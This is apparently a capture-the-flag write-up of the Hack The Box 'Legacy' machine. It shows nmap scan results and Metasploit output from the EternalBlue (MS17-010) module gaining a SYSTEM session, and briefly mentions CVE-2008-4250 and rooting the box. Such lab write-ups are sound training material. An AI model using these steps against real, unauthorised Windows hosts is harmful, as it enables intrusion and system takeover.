# HTB Legacy

Basic nmap scan:
```
Nmap scan report for 10.10.10.4
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 428.22 seconds
          Raw packets sent: 71567 (3.149MB) | Rcvd: 72996 (2.949MB)
```

Aggressive nmap scan:
```
Nmap scan report for 10.10.10.4
Host is up (0.094s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/24%OT=135%CT=1%CU=30409%PV=Y%DS=2%DC=T%G=Y%TM=641E2E
OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TS=0)SEQ(SP=105%GCD=1%
OS:ISR=10B%CI=I%II=I%TS=0)OPS(O1=M53ANW0NNT00NNS%O2=M53ANW0NNT00NNS%O3=M53A
OS:NW0NNT00%O4=M53ANW0NNT00NNS%O5=M53ANW0NNT00NNS%O6=M53ANNT00NNS)WIN(W1=FA
OS:F0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M5
OS:3ANW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M53
OS:ANW0NNT00NNS%RD=0%Q=)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%
OS:DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T7(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=8
OS:0%IPL=B0%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery:
|  OS: Windows XP (Windows 2000 LAN Manager)
|  OS CPE: cpe:/o:microsoft:windows_xp::-
|  Computer name: legacy
|  NetBIOS computer name: LEGACY\x00
|  Workgroup: HTB\x00
|_  System time: 2023-03-30T04:09:27+03:00
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9113b (VMware)
| Names:
|  LEGACY<00>          Flags: <unique><active>
|  HTB<00>              Flags: <group><active>
|  LEGACY<20>          Flags: <unique><active>
|  HTB<1e>              Flags: <group><active>
|  HTB<1d>              Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-security-mode:
|  account_used: guest
|  authentication_level: user
|  challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m37s, deviation: 2h07m16s, median: 4d22h57m37s

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1  99.75 ms 10.10.16.1
2  99.83 ms 10.10.10.4

NSE: Script Post-scanning.
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.98 seconds
          Raw packets sent: 1258 (65.306KB) | Rcvd: 4523 (187.256KB)
```

After looking at the above Nmap scan results, I noticied the old Win XP 2000 OS running on the machine in addition to SMB2 being disabled. I then ran crackmapexec to try to enumerate users and even though I could not enumerate them, it did also confirm the use of SMBv1 which are all indicators of being potentially vulnerable to the eternalblue exploit.

I checked this further with msfconsole and confirmed it is vulnerable.:

```
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 10.10.10.4:445        - Target OS: Windows 5.1
[*] 10.10.10.4:445        - Filling barrel with fish... done
[*] 10.10.10.4:445        - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445        - [*] Preparing dynamite...
[*] 10.10.10.4:445        - [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445        - [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445        - [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445        - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445        - Reading from CONNECTION struct at: 0x863e7800
[*] 10.10.10.4:445        - Built a write-what-where primitive...
[+] 10.10.10.4:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.10.10.4:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.10.10.4:445        - Getting the command output...
[*] 10.10.10.4:445        - Executing cleanup...
[+] 10.10.10.4:445        - Cleanup was successful
[+] 10.10.10.4:445        - Command completed successfully!
[*] 10.10.10.4:445        - Output for "net group "Domain Admins" /domain":

The request will be processed at a domain controller for domain HTB.

[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

However, since 5985 port is closed, I could not establish a connection with the changed credentials. However, I found the following CVE also associated with SMBv1 and Windows XP as well.
CVE-2008-4250

I had to revert the machine since I could not establish a connection. After the revert, I successfully executed the module in MSFconsole and was able to find the root and user.txt files.

**###ROOTED!!!###**
